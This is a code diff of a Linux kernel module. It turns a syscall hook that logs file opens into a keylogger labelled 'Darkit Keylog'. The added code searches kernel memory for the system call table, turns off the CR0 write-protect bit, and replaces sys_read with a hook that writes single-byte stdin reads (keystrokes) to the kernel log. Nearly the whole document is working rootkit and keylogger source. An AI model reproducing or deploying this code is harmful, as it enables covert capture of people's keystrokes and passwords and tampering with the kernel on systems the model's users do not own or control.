@@ -1,99 +1,66 @@
 #include <linux/module.h>
-#include <linux/init.h>
-#include <linux/types.h>
-#include <asm/uaccess.h>
-#include <asm/cacheflush.h>
+#include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/delay.h>
+#include <asm/paravirt.h>
 
-#define CR0_WP 0x00010000
+MODULE_LICENSE("GPL");
 
-MODULE_LICENSE( "GPL" );
+unsigned long **sys_call_table;
+unsigned long original_cr0;
 
-void **syscall_table;
-unsigned long **find_sys_call_table( void );
+asmlinkage long ( *ref_sys_read )( unsigned int fd, char __user *buf, size_t count );
 
-long ( *orig_sys_open )( const char __user *filename, int flags, int mode );
-
-/*
- * unsigned long **find_sys_call_table() {
- *    unsigned long ptr;
- *    unsigned long *p;
- * 
- *    for( ptr = ( unsigned long )rt_retcode;
- *         ptr < ( unsigned long )&print_trace_ops;
- *         ptr += sizeof( void * )) {
- *        
- *        p = ( unsigned long * )ptr;
- *        if ( p[__NR_close] == ( unsigned long )sys_close ) {
- *            printk( KERN_INFO "Found the sys_call_table!!!\n" );
- *            return ( unsigned long ** )p;
- *        }
- *    }
- *    return NULL;
- * }
- */
-
-
-/* patch sys_open to enable kernel alerting */
-long my_sys_open( const char __user *filename, int flags, int mode ) {
+/* intercept key strokes */
+asmlinkage long new_sys_read( unsigned int fd, char __user *buf, size_t count ) {
     long ret;
-    
-    ret = orig_sys_open( filename, flags, mode );
-    printk( KERN_INFO "[+] File %s was opened with mode %d\n", filename, mode );
+    ret = ref_sys_read( fd, buf, count );
+
+    if( count == 1 && fd == 0 )
+        printk(KERN_INFO "[+] Darkit Keylog: %X", buf[0] );
 
     return ret;
 }
 
-/* entry point: onload locate sys_call_table and patch sys_open */
-static int __init syscall_init( void ){
-    int ret;
-    unsigned long addr;
-    unsigned long cr0;
+static unsigned long **aquire_sys_call_table( void ) {
+    unsigned long int offset = PAGE_OFFSET;
+    unsigned long **sct;
 
-    /* need to figure out how to pass in the memory address of sys_call_table, hard code for now */
+    while ( offset < ULLONG_MAX ) {
+        sct = ( unsigned long ** )offset;
 
-    syscall_table = ( void *)0xc12cde90;
+        if ( sct[__NR_close] == ( unsigned long * ) sys_close ) 
+            return sct;
 
-    if ( !syscall_table ){
-        printk( KERN_INFO "[!] Failed to locate sys_call_table\n" );
+        offset += sizeof( void * );
+    }
+
+    return NULL;
+}
+
+static int __init interceptor_start( void ) {
+    if( !( sys_call_table = aquire_sys_call_table() ) )
         return -1;
-    }
 
-    /* flip the write protection bit off in the control register */
-    cr0 = read_cr0();
-    write_cr0( cr0 & ~CR0_WP );
+    original_cr0 = read_cr0();
 
-    addr = ( unsigned long )syscall_table;
-    ret = set_memory_rw( PAGE_ALIGN( addr ) - PAGE_SIZE, 3 );
-
-    if( ret ){
-        printk( 
-            KERN_INFO "[!] Failed to set the memory to rw (%d) at addr %16lX\n", 
-            ret, PAGE_ALIGN( addr ) - PAGE_SIZE 
-        );
-    } else {
-        printk( KERN_INFO "[+] 3 pages set to rw" );
-    }
-
-    orig_sys_open = syscall_table[__NR_open];
-    syscall_table[__NR_open] = my_sys_open;
-
-    write_cr0( cr0 );
+    write_cr0( original_cr0 & ~0x00010000 );
+    ref_sys_read = ( void * )sys_call_table[__NR_read];
+    sys_call_table[__NR_read] = ( unsigned long * )new_sys_read;
+    write_cr0( original_cr0 );
 
     return 0;
 }
 
-/* clean up before unloading */
-static void __exit syscall_release( void ){
-    unsigned long cr0;
-    cr0 = read_cr0();
-    write_cr0( cr0 & ~CR0_WP );
+static void __exit interceptor_end( void ) {
+    if( !sys_call_table ) {
+        return;
+    }
 
-    syscall_table[__NR_open] = orig_sys_open;
-
-    write_cr0( cr0 );
+    write_cr0( original_cr0 & ~0x00010000 );
+    sys_call_table[__NR_read] = ( unsigned long * )ref_sys_read;
+    write_cr0( original_cr0 );
 }
 
-module_init( syscall_init );
-module_exit( syscall_release );
+module_init( interceptor_start );
+module_exit( interceptor_end );
